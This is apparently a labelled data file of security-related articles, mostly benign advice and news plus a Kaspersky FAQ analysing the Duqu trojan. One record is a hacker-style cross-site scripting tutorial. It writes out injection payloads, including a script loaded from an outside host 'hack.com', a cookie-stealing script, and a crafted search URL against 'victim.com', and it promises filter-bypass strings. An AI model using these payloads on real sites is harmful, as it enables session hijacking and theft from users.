use these items properly. Default settings are often the least secure for devices as everyone with that same device will have the identical default settings.\nKeep Up With Patches\nIf the device is a laptop, netbook or PDA, keep the patches current. Most vendors provide simple notification and update procedures (e.g., Microsoft Windows Update). If the device is a BlackBerry or other device with a proprietary operating system, make sure that the operating system is updated frequently.\nDon’t assume that just because you are deploying new portable devices that they have current patches installed. Often, devices are produced months before they are sold and initial operating systems have since been updated.\nDisable Unused Access Methods\nIf you have a portable device equipped with a wireless card and that card is not being used, turn it off. Lock the portable device when not being used or when the device is being placed somewhere outside of your control.\nWhenever using mobile data, always consider, “What could happen if an unauthorized person gained control of this information?” Look for and try to use the most secure methods for handling data. Vendors are a good source of data. Visit their websites for additional information.\n|Rate this article 5 (excellent) to 1 (poor). Send your responses here\nJames C. Bourke, CPA.CITP, CFF, is a partner at WithumSmith+Brown and also the director of Firm Technology. He is a past president of the New Jersey Society of CPAs and currently serves on AICPA Council and chairs the AICPA CITP Credential Committee. He was recently named one of the Top 100 Most Influential People in the profession.", "label": 1}
{"text": "Hello friends. These days I am on an XSS rampage. I recently posted an article on XSS vulnerability in Babylon search. Since then I got several request from the readers to post a quick article on cross site scriptting. This tutorial will be divided into two parts. In the first part I will cover the basics of XSS and how the attack vector is implemented. In the next tutorial we will discuss some techniques by which we can prevent XSS attacks.\nOWASP lists sql injection and XSS as the two most common vulnerabilities in web pages and web apps. We have covered SQL injection quiet extensively so I decided to write on xss.\nCross Site Scripting or XSS is a web application attack that involves injecting a piece of malicious code into the vulnerable web application/web page. The attacker injects a client side script mainly through the web browser to reach the other users of the particular website. This attack can open several doors for the attacker ranging from session hijacking to entire database compromise.\nReflected or Non-persistent XSS attack\nThis is the most common form of XSS attack in which the attackers crafts a malicious code and transfers it to the server side either through the HTTP request parameter or through some HTML form submission. A simple Reflected XSS attack looks like this-\n<script>alert(‘xss’);</script> (Embedded Script)\n<script src=http://hack.com/xss.js></script> (External script)\nConsider this real time example of reflected XSS in action:\nStored or Persistent XSS attack\nThis attack is more dangerous and complicated compared to reflected XSS attack. In Stored or persistent XSS attack, the vulnerable script is stored on the target server and is activated once another user clicks on it. For example, consider a forum where the attacker posts a message containing a link to malicious script. Another user when views the message and clicks it, then the script activates and causes respective attack.\nThe attacker can craft a malicious script like a cookie stealing script of the form <script>alert(document.cookie);</script> and steal victims cookies to perform session hijacking.\nDOM based XSS attack\nConsider the following piece of code:\nvar loc = document.location + '?gotoHomepage=1';\ndocument.write('<a href=\"' + loc + '\">Home</a>');\nComplete Cheat Sheet on XSS:\nBypassing Xss Simple Filteration Without Alteration:\nNow we notice, the above script we used for filtration is evolving only a few strings, knowing there are bunch of ways and\nstrings to inject a malicious request.\nIt's only filtering '< > /' means leaving hackers with a vast amount of other strings to inject a malicious code.\nThis will generate an alert box again on a vulnerable server.\nThis will too generate an alert box on a vulnerable server.\nBypassing Advance Xss Filtration:\nSome webmasters filter lot more than this, especially it's filtered on important sites like gov and org sites.\nThere's nothing impossible, we will try to get as much info about the filtration as much we can.\nSupposing a server that have filtered all strings just more than common in a way that it reads the malicious string in the beginning or in the end to avoid and abort it, this of course can be bypassed too!\nAn example can be likely so:\nThe above script will bypass filtration for the server that reads the malicious string in the beginning.\nThis will bypass filtration on server that reads whether in the beginning or in the end or at both ends!\nMostly, this kind of filtration isn't common, so cant be of much use.\nSome webmasters also filter the word 'xss' so it's likely to use some other message for making an alert.\nThis will bypass message filtration.\nNow we will study some more advance filtration bypass.\nSome webmasters just simply define a pattern of a cross-site scripting script that is possibly common.\nIn this case, I will mention here the full array of strings to inject, bypassing the filtration.\nWe will suppose injecting in a search form.\nvictim.com/search.php?query=\"><script src='http://malicous js'</script>\nThese are a few simple and advanced scripts that can be used to check for XSS vulnerability. There are several automatic tools available as well but I would recommend that you first learn the manual method so that you can clearly understand the attack vector. Later on you can switch to automatic tools. In case you know any other XSS script that is missing in this tutorial then you can add in the comment box and I will update it in this tutorial along with your name.\nSpecial Thanks : str0ke,USMAN,tushy,Hackman,shubham,Fix", "label": 1}
{"text": "IP addresses, strings of numbers that identify computers on the Internet, should generally be regarded as personal information, the head of the European Union's group of data privacy regulators said Monday.\nPeter Scharr, Germany's data protection commissioner as well as head of the EU data privacy group, told a European Parliament hearing that when an IP, or internet protocol, address identifies an individual user, then it must be considered personal data. Scharr's team has been commissioned to report on Internet search engine providers such as Google, Microsoft, and Yahoo, and examine how their Internet privacy policies stack up against E.U. privacy law.\nCompanies like Google disagree with his conclusion because knowing the IP address of a certain computer doesn't necessarily tell you who is on that computer at any moment. A point Scharr concedes as computers with Internet access at cafés, libraries, and offices are examples of computers with multiple users per IP address.\nHowever, \"WHOIS\" Web sites have popped up where a user can type in an IP address and receive the name of the person or company identified with it.\nThe AP says if IP addresses become privileged personal data, this will have a far-ranging effect on how search engines record data.\nGoogle says it needs to store search queries and gather information on online activity to improve its search results and to provide advertisers with correct billing information that shows that genuine users are clicking on online ads.\nInternet \"click fraud\" can be tracked by showing that the same IP address is jumping repeatedly to the same ad. Advertisers pay for each time a different person views the ad, so dozens of views by the same person can rack up costs without giving the company the publicity it wanted.\nOn the other side of the Atlantic, CRMDaily.com reports that the Federal Trade Commission's verdict on whether IP addresses constitute private, and thus protected, information is still out.", "label": 1}
{"text": "November 26, 2012: March 8, 2011: Hacktivists are non-government organizations, or even individuals, who launch Internet based attacks in the name of a favorite cause. After Hamas declared war on Israel on November 15th, many Western hacktivists declared themselves allies of Hamas and launched attacks on Israel. Like Hamas, the hacktivists promptly began issuing press releases detailing their victories. But, like the Hamas claims, the hacktivist victories were illusions and fabrications. Despite over eight million attacks (nearly all of them automated) a day, the main targets (Israeli media, government, and military sites) were largely unscathed. The Israelis were prepared, because they have been under attack for a long time. Moslem attackers have not been skilled enough to do much, if any damage. While the many recent cyber attacks against Israel were in the name of Hamas and Gaza, few were from Arab countries. Most were from hackers living in the West.\nA major player in this attack was the hacktivist group Anonymous. While Wikileaks has shown some care in not revealing information that would get counter-terror operatives (or informants) killed, a similar operation, Anonymous, has not demonstrated any restraint. For example, in an effort to get other hackers to stop pursuing Wikileaks supporters, the Anonymous crew broke into the network of a firm that did counter-terrorism work (HBGary Federal) and put on the Internet emails revealing how hacking software was used to gain access to terrorist computers and communications. Among the more interesting items revealed was the widespread use of USB thumb drives to gain access to the terrorist computers. Another revelation described how laptop ExpressCard ports could be used as well. The techniques revealed are not rendered completely useless, just less effective. Islamic terror groups tend to attract the less educated and people who don't pay attention as much as they should. But for the sharper terrorists, life just got a little easier and safer.\nThat was a wakeup call for many computer security and counter-intelligence business, demonstrating that the least vulnerability in their own computer security could be exploited by someone with some decent hacker skills.\nFor over a decade Moslem hacktivists have been trying to muster an effective Cyber War capability. So far they have failed. Even before September 11, 2001, there were attempts to build an alliance of anti-U.S., anti-Israel, and anti-India hackers who could pool their efforts to achieve a more significant impact. While there were more attacks against U.S. and Israeli web sites after September 11, 2001, these two nations contained the world's largest concentration (per capita) of Internet talent and were not very vulnerable to attack. Major commercial and government operations in both these nations have also been taking computer security more seriously since September 11, 2001, which has also made it harder for the casual (often an anti-social teenage male) hacker to make much of an impression.\nBut the threat is still there (as detected by monitoring chat rooms, email, and other sources) and is taken seriously. Some groups, however, operate openly (more or less). These groups call themselves hacktivists (activists who use low level hacking to publicize their positions). A decade ago there were three hacktivist groups prominent in backing the Dark Side in the War on Terrorism: USG (Unix Security Guards), an anti-Israel alliance that claimed responsibility for many known attacks against Israeli sites, WFD (World's Fantabulous Defacers), an alliance of 12 Pakistani hacker groups that claimed (or was blamed) responsibility for hundreds of attacks (mainly against Indian sites) between November 2000 and September 11, 2001, and AIC (Anti-India Crew) another Pakistani hacker alliance that also claimed to have made hundreds of attacks against India. Nothing much came of these three groups or the equally boastful successors.\nNote that Pakistan has a long history with software development and hacking. The first computer virus to spread worldwide (the Brain virus), was created in Pakistan by Pakistani programmers. If the Islamic world is going to recruit world class hackers for hacktivism or something more serious, the manpower was likely to come from Pakistan. But that never happened. Anyone in a Moslem country with hacker quality computer skills wants to monetize them, not risk death or life in prison supporting Islamic fanatics. Thus the Islamic terrorists have been dependent on Western hacktivists and not the most competent ones.\nThe Islamic hactivists have an image problem, in that many of them have supported Islamic terrorist groups and urged everyone to kill infidels (non-Moslems). Since Islamic terrorists have proved more adept at killing fellow Moslems, you would think Islamic hacktivists would protest against this. Most have not and continue to ascribe the misdeeds of Islamic terrorists as part of a vast American and Israeli conspiracy. This attitude does not work when you are trying to create effective hacker tools either.", "label": 1}
{"text": "This just had some basic tips in order to avoid malware issues. Most of it is common knowledge but just some key points:\n- Install anti-malware programs on the computer. More than one can be beneficial since different programs update at different times so one might not catch something that another would. Also, make sure they are always fully updated.\n- Use strong passwords. The article recommends passwords at least 14 characters long but even longer is better. Stronger passwords use upper and lowercase letters, non-alphabetic characters, and tend not to follow a recognizable pattern.\n- Don’t be tricked. Possibly the most important piece of information contained in the article had nothing to do with technology. If something online doesn’t seem safe, odds are that it isn’t and a good amount of the time things that do seem relatively safe can still contain malware. Knowing this, one of the most effective strategies is to distrust any unknown sites, downloads, or links and hopefully whatever anti-malware software is installed can filter out anything that might slip by.", "label": 1}
{"text": "What are IM attacks?\nAs computer security has improved, and users have gotten more savvy about not opening every attachment that\nlands in their in-boxes, hackers and virus writers have been recognizing and exploiting the opportunities presented\nby IM-based attacks, the numbers of which have risen sharply over the last years.\nOn the rise\nInstant messaging clients like AOL Instant Messenger (AIM), Yahoo! Messenger, MSN Messenger, and the chat feature in Skype have all been targeted. And unlike the simple viruses of years past, the IM threats have evolved into multi-staged attacks that have the potential to cause significant harm to users' computers.\nInstant-messaging threats work much like e-mail ones, where malware is launched when the recipient clicks on an executable file attachment or on a hyperlink that then links through to a malicious website. Instead of being sent over e-mail, however, these threats are spread through IM chat sessions.\nIM Worms and spim\nAn IM worm is self-replicating malware that spreads in IM networks. When an IM worm infects a PC, it locates the address book for the IM client, which is called a buddy list or contact list, and tries to send itself to all the infected person's contacts. Some IM worms use social engineering techniques to trick the recipient into accepting a message that contains the malicious code.\nInstant messenging software is also being used to deliver spam. Spam delivered through IM instead of e-mails is known as spim.\nThe number of IM threats such as viruses, worms, and phishing scams has been steadily increasing over the years. In December 2007, over 18 new malicious code attacks over instant messaging (IM) networks were discovered, bringing the 2007 total to 346. In 2004 there were almost no IM attacks, and in 2006 the number was around 130.\nNearly 20 percent of IM threats in 2007 were reported on the AOL Instant Messenger network, 45 percent on MSN Messenger and 20 percent on Yahoo! Messenger.\n2007 also marked the first IM prosecution in the US, punishable by $1.75 million in fines and nearly 60 years in prison, against a computer security consultant for using illegal IM botnets to hijack PayPal accounts.\nLearn more about BullGuard Antivirus.\nLearn more about BullGuard Spamfilter.", "label": 1}
{"text": "At the same time, organizations, particularly those in highly regulated sectors, find themselves subject to increasing amounts of pressure from auditors, regulators and customers to safeguard data storage from loss, theft and inappropriate access. The Payment Card Industry (PCI) Data Security Standard, which requires all payment card information to be encrypted, is one example of such regulation.\nWhen considering encryption, remember that it can be applied to data in-flight or data at-rest. Data in-flight refers to information encrypted when in transit from one point to another, for example over the local-area network (LAN) or wide-area network (WAN). Encryption of data at-rest occurs when information is stored on media such as disk or tape. Storage encryption is concerned with data at-rest rather than encryption of data in-flight, which is provided at the network layer and comes embedded in hardware from vendors such as Brocade and Cisco Systems.\nThere are several ways to enable storage encryption:\n- Through encryption technology embedded in backup software\n- Via encryption appliances that plug into storage networks\n- Through ASICs located at the drive level\n- In encryption software applied to devices and removable media\nHere's a quick overview of the pros and cons of each of these options.Encryption technology embedded in backup software\nThe functionality required to encrypt data backups is incorporated into most backup software products. The advantage of undertaking encryption in this way is that it's possible to switch on encryption functionality without the need to change device drivers or drive settings, which makes it a cost-effective option for retrofitting to existing infrastructures.\nBut there are disadvantages. Encryption software can generate throughput bottlenecks because data encrypted as it passes between the LAN and the storage infrastructure will incur a processing overhead.\nEncryption appliances that plug into storage networks\nEncryption appliances provide a relatively quick and easy means of retrofitting encryption capabilities onto existing systems because they plug directly into the fabric/network. They're best suited to large shared storage environments with bulk data encryption requirements because deploying multiple devices across the organisation can become an expensive proposition. These devices generate low performance overheads on the storage infrastructure.\nBut research firm Gartner expects appliances to be superseded over the next three to five years as encryption functionality is increasingly included natively in storage systems.\nIt's also worth bearing in mind that the reality of installing encryption appliances may not be quite as simple as vendors promise and can require third-party help. Key vendors in this space include CipherMax, CipherOptics, Crossroads Systems, Digital Security International, Exar's Hifn Technology, NetApp, SafeNet's Ingrian and Vormetric.\nEncryption using ASICs located at the drive level\nASIC chips for encryption purposes are embedded into everything from external hard drives and tape drives to storage arrays. All of the key primary storage and tape library vendors have gone down this route. The advantage of this approach is that the host system doesn't suffer any performance overhead when encryption and decryption activity take place. This is because software code is baked into the silicon of the chip.\nThe downside is the cost involved if organisations want to retrofit or replace existing kit with the new technology, not least because it comes at a premium.\nEncryption software applied to devices, removable media\nThe most common use case for encryption is to protect removable media such as laptops and portable drives, although encryption of backup tapes is becoming increasingly common. The focus on removable media is due to obvious concerns over safeguarding data when it leaves the enterprise as more people ship backup tapes offsite and use mobile equipment.\nThe Britannia Building Society in Stoke-on-Trent is encrypting removable media and also performing some native database encryption.\nLaptop hard drives are encrypted and users are prompted for a password at power on. Without a password, the disk is unreadable, even if the hard drive is installed on another machine. USB ports are locked down by a piece of software on all PCs, which means there's no way to transfer data out of the company via USB devices that are unauthorised or insecure. If an encrypted USB stick is lost, the data is still safe. LTO-4 tapes have encryption capabilities that could be used if Britannia Building Society wanted to send them offsite.\nDylan Mathias, Unix and storage manager at Britannia Building Society, declined to name the specific products used at his firm but said, \"All these technologies are designed to prevent the data from being read if the device involved falls into the wrong hands. You have to assume sooner or later you will lose one of these things. The hardware can easily be replaced; the loss of data cannot.\"\nInhibitors to storage encryption technology\nSome of the major reasons why encryption technology isn't universally applied at the moment include the upfront purchasing costs often associated with encryption, and user concerns that encrypting and decrypting data can slow data throughput.\nDeploying encryption technology at the storage subsystem is only \"just beyond early adoption\" and is unlikely to move into the mainstream for another three to five years, according to Rene Millman, a senior research analyst at Gartner. One reason for this lack of uptake is that organisations often believe data held within the walls of the enterprise to be less vulnerable.\nFor example, Britannia Building Society's Mathias isn't convinced about the need to encrypt at the array level.\n\"The theory behind it is that someone might steal an entire array, but you'd need a JCB to do that and it would be quite an achievement,\" he said. \"I can see the argument for encryption on portable devices and tape backups, but I'm not convinced of the need to encrypt the entire array.\"\nBut Andrew Reichman, a senior analyst at Forrester Research, believes such technology can play a role in securing data should hardware need to be returned to vendors or when it reaches end of life. Without an encryption key, third parties can't read sensitive corporate data. As a result, organisations can destroy the encryption key rather than pay for data destruction services.\n\"It's not an area that has been focused on much, but people are starting to see the value of addressing this issue in a more systematic way,\" Reichman said.", "label": 1}
{"text": "Why do Passwords Appear as Dots in a Form?\nWhen I want to subscribe myself for a newsletter, website, online application or want to sign in, I need to put in my password. This is the easiest way to protect websites/applications and it works, but what I really don’t understand is why passwords appear as dots in the textfield.\nTo me this is against the basics of user friendlyness because people need to see a clear result of their action, eg. a keystroke. This way you can’t know which dot represents which character (unless you start to count), so there is a possibility that you made a typo in the password. Of course this can be simply overcome with a second textfield which checks if both passwords are the same, but what happens if you copied the first password and paste it in the second textfield? Your subscription is send of for confirmation with the wrong password.\nIt’s been encouraged to make your passwords longer (8-16 characters) and to use combinations of different characters (abc – 123 – ?!), otherwise the form will not be send away. These kind of demands make it even more difficult to avoid typos. Although I understand that you can’t put just anything in the textfield and you should think this over carefully, that doesn’t mean it can’t be done in a user friendly manner.\nThe more I think about it, the more I wonder why and when these dots appeared for the first time… I guess it was in the ’90 when only one person had a pc and had to share it with the rest of the village. Whenever the user switched the power on, the others were watching as well, out of curiosity. Back then they had to find a way to scramble the password while typing it into the textfield to keep it a secret. All stupidity aside, this could have been a nice story, no?\nThe obvious reason why we still set the password field as dots, is security… we didn’t want people to have a peek in the ’90 and we still don’t allow it now. The computers are getting smaller with the year and what started out as a computer for the entire village is now a small electronic device inside your pocket. The pc has never been more personal than now, making the peeking-over-your-shoulder story less likely.\nThis solutions seems to work just fine but it has its flaws. First of all it requires an extra click from the user which can be annoying for those who go through forms with the tab key. Secondly, what if you checked your password by pushing the button and forgot to change it back to password mode?\nFor this reason I came up with another idea, no unnecessary clicks and easier to go through the form. The status of the text field is set to ‘password’, but once you enter it with the tab key or mouse click the status is changed to ‘text’ which makes your password readable. When you leave the text field, the status is changed back to ‘password’, making your password again unreadable. Unfortunately, after two days of coding I still didn’t get the result I was hoping for. After searching on the web I’ve found an example made by viget.com.\nI would have liked to put the example in this post but it was conflicting with the current version of jquery.\nI’ve tried the code in different browsers and it works in Internet Explorer (6,7 and 8), Firefox, Safari and Google Chrome. Special thanks to the people of viget.com\nI’ve been looking into free online mail applications and found mailchimp as a nice solution. Apparently mailchimp is using the second solution for the password-in-dots story. Have a look at the image below.\nMailchimp prompts the user to fill in their password only once. With the help of a little checkbox, you can quicly unveil the password to check it for possible typo’s. jQuery has a little plugin to unmask the password by clicking on a checkbox.\nReceive updates via RSS mail\nGet the latest articles and resources straight in your inbox, nice and easy. Have a preview of the email. You can, of course, unsubscribe at any time.", "label": 1}
{"text": "Progressive Business Publication Scam Alert\nIdentity thieves are constantly creating new ways to scam unsuspecting people. That’s why it’s essential to recognize the three most common technology-related scams known as Phishing, Vishing and SMiShing.\nPhishing scams use email, while Vishing attacks come over land telephones. SMiShing scams target the users of mobile devices.\nThe common element to all three scams is to collect confidential personal and financial information.\nHere’s a closer look at how they work.\nPhising is an attempt to get your password or credit card number by sending out phony email that looks like it comes from a trustworthy entity, usually a bank but possibly also a social website, an online payment processor or even an IT company. The phony email contains a link to a site that looks and feels like a real company.\nIf you click the link and go to the site, you’re directed to enter financial or other details, even to log in if it’s a mock up of your real bank site.\nBut even if you do none of these, the site has probably already downloaded malware onto your computer to try to capture your private information.\nThe term Phising is derived from fishing, and is a reference to baiting a victim into biting on a malicious link, etc.\nVishing scams use Internet-based telephone systems to gain access to private and personal data. The term comes from “voice” and phishing. It goes like this: You answer the phone and an automated recording informs you your credit card, or maybe your bank account, had suspicious or fraudulent activity and you need to call a certain number right away.\nThe recording tells you the number to call and says your account or card has been deactivated until further notice. When you call, you get another recording telling you to enter your bank or credit card number on the key pad to confirm who you are. Don’t do it.\nThis kind of scam is also used to get a security PIN, expiration date, date of birth, etc.\nSMiShing is similar to the other scams, but uses cell phone text messages to deliver the bait and get someone to divulge personal information. The name is a combination of Short Message Service technology and phishing.\nThe hook in this scam is a website or phone number the user is required to connect with.\nSmiShing often involves something that needs immediate attention, such as confirming you’ve signed up for a discounted subscription, and you’ll be charged $8 a day unless you cancel the order. Then it gives you a phone number to call to cancel.\nOf course, you can’t cancel without entering your vital personal and financial information, which is the raison d’etre behind the scam in the first place.\nA recent variation of this involved retail giant WalMart, which issued a fraud alert regarding a large number of SmiShing texts that offered a phony $1,000 gift card as bait.\nThe key to handling all three of these scams requires the same reality check: If you feel a need to contact your bank or credit card company, use the number on the back of your credit card or call or visit a branch office you know for sure is real!", "label": 1}
{"text": "As network technology becomes increasingly important to operate security systems, and affordably priced Internet protocol (IP) cameras and video management systems (VMS) are used more often, system designers and installers, such as electrical contractors, are realizing the need and efficiency of using power over Ethernet (PoE).\nFirst used for voice over IP (VoIP) telephones, PoE has gained popularity as a means of safely allowing power, along with data, to pass on Ethernet cabling.\n“PoE voltage is 48V DC and sourced from an injector, midspan or switch, which provides power. A PoE source will only provide the necessary power when it recognizes the class or signature of a compatible network device so that, in the event a non-PoE IP device is inadvertently connected, the PoE source will not provide power and damage the device,” said Ronnie Pennington, national accounts manager for Altronix Corp., Brooklyn, N.Y.\nFrom VoIP in the 1990s, PoE is now migrating to powering security system components, such as IP cameras and access control and sensor equipment.\n“It’s a natural choice for the security market because it enables the user to leverage a common network infrastructure,” said Patrik Pettersson, product analyst for Axis Communications Inc., Boston.\nIt’s also more environmentally friendly because, if the device only needs 7 watts (W) to operate, the switch only allocates the required operating wattage, even though the original IEEE 802.3af 2003 PoE standard provides up to 15.2W of DC power to each device.\n“First and foremost, PoE standardizes the deployment of security system devices on one type of cabling infrastructure so that now only one Cat 5 or 6 data cable can be used for video transition, power to the product and control of the camera,” Pettersson said.\nAnd because the network switch now also functions as the power supply, that switch can be protected by an uninterruptible power supply (UPS) battery backup.\n“A power outage or other disaster is one of the most critical times for security and surveillance. With a proper disaster backup and recovery strategy, the end-user can keep the PoE-powered surveillance system running along with other critical applications,” he said.\nSince the PoE cable is directly tied into the intelligent network system, the power supply also is now intelligent, enabling remote control of individual circuits and devices, diagnostics and maintenance capabilities, Pettersson said. Intelligent switches that enable the user to remotely toggle the power on and off provide the choice of when to reboot a device (if necessary while troubleshooting) for minimal impact to the security and surveillance system.\n“It also eliminates the need for a truck and ladder to reach the camera for a physical reboot,” he said.\nOne of the challenges, however, of using PoE for security system power is the limitation of structured cabling to transmit beyond 100 meters, according to Pennington.\n“IP data can be extended up to 600 meters using Ethernet repeaters, but installers and system integrators should take into consideration that there will be a voltage drop along the way,” he said.\nWhile the data range can be efficiently extended using plug-and-play repeaters, the voltage, in that case, may be insufficient to power the device, and a local power source may be needed.\n“Because of this, contractors need to perform proper power calculations and invest in PoE testing tools, which test both the power and data integrity of a multiple cable system,” Pettersson said.\nFactors to consider\nIn choosing to use, specify or design PoE switches for a security system, it is important for contractors to select a switch that is compatible with the system’s edge devices’ power requirements and offers desired features, Pennington said.\n“It is ideal to use a PoE midspan or injector with an external Ethernet switch, rather than an integrated PoE switch for security. If the PoE switch is shut down for maintenance or if power is lost, the surveillance system would be inoperable, but when using a PoE midspan or injector, power is still supplied,” he said.\nContractors also need to consider the power budget of the security system’s devices and perform power-draw calculations, which includes reading the PoE network switch manual and fully understanding the specifications.\n“For example, if a 24 port is shipped with a 150W power supply and it offers PoE on all 24 ports, it will not support 15.4W per channel, as outlined by the current standard,” Pettersson said.\nMoving forward, the IEEE 802.3at standard in development, also known as PoE+, will enable up to 50 or 55W sometime within the next three years.\n“The standard is being driven upward by the more powerful security system devices that are being developed, even as those devices are becoming more energy-efficient,” Pettersson said.\nBREMER, a freelance writer based in Solomons, Md., contributes frequently to ELECTRICAL CONTRACTOR. She can be reached at 410.394.6966 and firstname.lastname@example.org.", "label": 1}
{"text": "Divided We Stand: A Guide to Partitioning Your Hard Drive\nWant to make your computer faster, easier to manage, and able to share data more securely? Dividing your hard drive into smaller sections called partitions can make your computer more manageable. Windows® 7 comes with an easy-to-use disk management tool that will help you partition your drive—and you won’t have to buy additional software.\nWhy partition a drive? Here are a few common reasons:\n- More than one person uses the computer and you want to keep separate files—and access rights—for security reasons. Partitioning can be particularly helpful when you share a PC with a child.\n- You want to squeeze more performance out of your PC. Partitioning a large drive into smaller units improves performance by decreasing the amount of travelling the drive’s read/write head has to do when it searches for data. A partition also shrinks the size of the tables the computer uses to keep track of where data is stored, further improving performance.\n- You want to make your system more manageable. If you keep your operating system and applications on a partition separate from your data, the data will be easier to back up and easier to restore. What’s more, if you need to reinstall the operating system, you can do it without worrying about the data on the other partition.\n- You want to make your data more secure. If part of your hard drive becomes corrupted or infected with malware, the other partitions have a good chance of remaining unscathed.\nStep by Step\nPartitioning a hard drive is simplest if you haven’t already loaded applications and data, so if you’ve just purchased your PC, now is the time to do it. However, you can do it at any time. Just be sure you do a complete backup before you start.\nTo turn one partition into two partitions:\n1. Open the Control Panel, Administrative Tools and click Computer Management.\n2. Double-click Storage in the middle pane, and then double-click Disk Management\n3. \"Disk 0\" represents your primary hard drive. If your drive has not been partitioned, the C: drive will fill most or all of the space\n4. Right-click on the C: drive or on unpartitioned space and click \"Shrink Volume.\" (Windows refers to partitions as volumes.) Windows will you for the amount of space you wish to shrink; this will become the amount of space available for the new partition. Choose an amount that matches the amount of data you expect to store there: Less for\n5. Follow the s to complete the shrink function.\n6. You will now have unpartitioned space in which you can create a second partition. Right-click in this unallocated space and click \"New Simple Volume.\" Follow the s to set the size of the partition and assign a drive letter to this space.\n7. Finally, you will be ed to format the new partition you’ve made. Select OK at the s to complete the format operation. Your new partition is ready to use.\nFor more help on disk partitioning, consult this guide\nThe above content is provided for information purposes only. All information included herein is subject to change without notice. Samsung Electronics is not responsible for any direct or indirect damages, arising from or related to use or reliance of the above content.\n- Why LED Monitors Are Best for You\n- Which is Right for You: Netbook or Notebook?\n- 4 Ways to Back Up Your Laptop\n- Mobile CPU Roadmap: Picking the Right Intel Chip\n- Samsung Laptops: Something for Everyone\n- Laptop Memory Basics – What's Best: DDR2 or DDR3?\n- HDTV Monitor 101\n- Top Ten Benefits of SSD\n- Green Report Card\n- Finding the Killer Computer", "label": 1}
{"text": "This is an active investigation by Kaspersky Lab's Global Research & Analysis Team. We will be updating this FAQ document as necessary.\nDuqu is a sophisticated Trojan which seems to have been written by the same people who created the infamous Stuxnet worm. Its main purpose is to act as a backdoor into the system and facilitate the theft of private information. This is the main difference when compared to Stuxnet, which was created to conduct industrial sabotage. It's also important to point out that while Stuxnet is able to replicate from one computer to another using various mechanisms, Duqu is a Trojan that doesn't seem to replicate on its own.\nUnlike Stuxnet, Duqu doesn't target PLC/SCADA equipment directly, although some of its subroutines could be used to steal information related to industrial installations. It appears that Duqu was created in order to collect intelligence about its targets, which can include pretty much anything that is available in digital format on the victim’s PC.\nIn the cases we have analysed, Duqu infects a computer through a targeted attack involving a Word document which exploits the CVE-2011-3402 vulnerability. This is a 0-day vulnerability in the Windows kernel component Win32k.sys which allows the attackers to run code with the highest privilege level, bypassing pretty much most of the protection mechanisms from Windows or security software. According to our knowledge, Duqu is the only malware using this vulnerability to infect computers. All Kaspersky Lab security solutions detect this vulnerability under the name Exploit.Win32.CVE-2011-3402.a as of November 6, 2011.\nThere is indeed a 0-day vulnerability being used to infect computers in the initial phase. Microsoft released an advisory (2639658) with basic information and mitigation steps.\nDuqu was brought to the attention of the security community by the Hungarian Research Lab CrySyS. They were the first to point out the resemblance to Stuxnet and perform what remains the most thorough analysis of the malware yet.\nThe first Duqu attacks were spotted as early as mid-April 2011. The attacks continued in the following months, until October 18, when news about Duqu was made public.\nIt appears that there are at least seven variants of the Duqu drivers, together with a few other components. These are all detected with different names by various anti-virus companies, creating the impression that there are multiple different variants. At the time of writing, we are aware of two Infostealer components and seven different drivers. Additionally, we suspect the existence of at least another Infostealer component which had the capability to directly search and steal documents from the victim's machine.\nWhile there are indeed reports indicating that the main goal of Duqu is to steal information from CAs, there is no clear evidence at this time to support this claim. On the contrary, we believe the main purpose of Duqu was different and CAs were just collateral victims.\nOne suspicion is that Duqu was used to steal certificates from CAs that can be used to sign malicious code in order to make it harder to catch. The functionality of the backdoor in Duqu is actually rather complex and it can be used for a lot more. Basically, it can steal everything, however, it looks like attackers were particularly interested in collecting passwords, making desktop screenshots (to spy on the user) and stealing various kinds of documents.\nThe initial Duqu C&C server, which was hosted in India is no longer active. Just like in the case of Stuxnet, it was pulled offline pretty quickly once the news broke. In addition to this, we are aware of another C&C server in Belgium, which was also quickly taken offline. Actually, it appears that every single Duqu targeted attack used a separate C&C server.\nMaybe the author was a fan of round numbers, such as 6x6? :) Actually, the time for which Duqu is running in the system is defined by the configuration file and varies between the attacks. We have also seen instances where the duration was set to 30 days.\nThe same gang who was behind Stuxnet. Curiously, they seem to have picked up an interest in astronomy; the infostealer executable has a portion of a JPEG file picked up by the Hubble telescope (“Interacting Galaxy System NGC 6745”):\nThe picture portrays the aftermath of direct collision of two galaxies(!), several million of years ago. You can read the story here.\nUPDATE (November 15, 2011):\nWhen activated, the main Duqu program body connects to its C&C server and downloads updates and supplemental modules. One such module is the Duqu \"infostealer,\" for which two versions are known and others are believed to have existed at various points in the time.\nThe \"infostealer\" module is downloaded in memory and executed through the process injection technique used by Stuxnet and Duqu to avoid temporary files. This is done in order to make sure that the \"infostealer\" component (and other Duqu updates) will not be intercepted or left behind on an infected machine. It also means that they have a limited lifetime, basically until the next system reboot.\nThe most powerful version of the \"infostealer\" has the ability to intercept keystrokes, it makes screenshots of the whole screen (first time) and of the active window, collects the IE browsing history and various data related to the system network configuration. There is also code which can do browsing of network shares. All this information is nicely packaged into a file that is written into the %TEMP% folder by default. It is a compressed BZIP2 format with modified headers. Thanks to the BZIP2 compression, the files are smaller than you'd think.\nThe \"infostealer\" components we have seen create files with the name \"~DQx.tmp\". In addition to this, we are aware of other files with the name \"~DFxxxxx.tmp\" and \"~DOxxxxx.tmp\". The \"DF\" and \"DO\" have a similar format and appear to have been generated by an earlier version of the \"infostealer\". They also contain more information, including various files the victim PC such as Word or Excel documents. The \"~DF\" files are generally much bigger, due to their additional file content.\nIn all cases, they are easy to recognize by the header \"ABh91AY&SY\". If you find such files in your PC then most likely you've been a victim of Duqu. If you'd like to scan your system for such files, the nice people at CrySyS have a set of tools that can help.\nDuqu and Stuxnet have a lot of things in common. Usage of various encryption keys, including ones that haven't been made public prior to Duqu, injection techniques, the usage of zero-day exploits, usage of stolen certificates to sign the drivers, all of these make us believe both have been written by the same team.\nSo, what does that mean exactly? Simply put, different people might have worked on Duqu and Stuxnet, but most likely they worked for the same \"publishing house.\" If you want an analogy, Duqu and Stuxnet are like Windows and Office. Both are from Microsoft, although different people might have worked on them.\nIn the incidents we have analyzed, Duqu arrives in the system in the form of a Microsoft Word Document. The document contains an exploit for the vulnerability known as CVE-2011-3402. This is a buffer overflow in a function of Win32k.sys which deals with True Type fonts. To exploit this specific vulnerability, an attacker needs to craft a special True Type Font and embed it into a document, for instance, a Word Document.\nNow, for the connection part - in the incident we've analyzed (and this is also true for the other known incident), the attackers used a font presumably called \"Dexter Regular\", by \"Showtime Inc.,\" (c) 2003. This is another prank pulled by the Duqu authors, since Showtime Inc. is the cable broadcasting company behind the TV series Dexter, about a CSI doctor who also happens to be a serial killer who avenges 